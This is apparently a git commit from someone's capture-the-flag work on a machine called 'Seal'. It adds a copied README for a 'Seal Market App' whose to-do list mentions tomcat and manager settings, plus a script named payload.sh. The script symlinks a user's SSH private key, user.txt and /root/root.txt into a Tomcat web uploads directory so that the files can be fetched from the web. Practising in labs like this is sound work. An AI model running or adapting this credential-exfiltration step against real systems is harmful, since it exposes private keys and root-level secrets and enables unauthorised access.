8fe111194bdd596b36a8583a5eaa9f79c99f0229
ice1187 <icing@gmail.com>
2021-07-14 05:03:26 +0800

    Seal done

---
+++ seal/gitbucket/seal_market-master/README.md
@@ -0,0 +1,8 @@
+Seal Market App
+===============
+A simple online market application which offers free shopping, avoid crowd in this pandemic situation, saves time. 
+
+## ToDo
+* Remove mutual authentication for dashboard, setup registration and login features.
+* Deploy updated tomcat configuration.
+* Disable manager and host-manager.
---
+++ seal/payload.sh
@@ -0,0 +1,7 @@
+date
+ln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/a 
+ln -s /home/luis/user.txt /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/b
+ln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/c
+ln -s /root/root.txt /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/d
+ln -s /home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/e 
+date
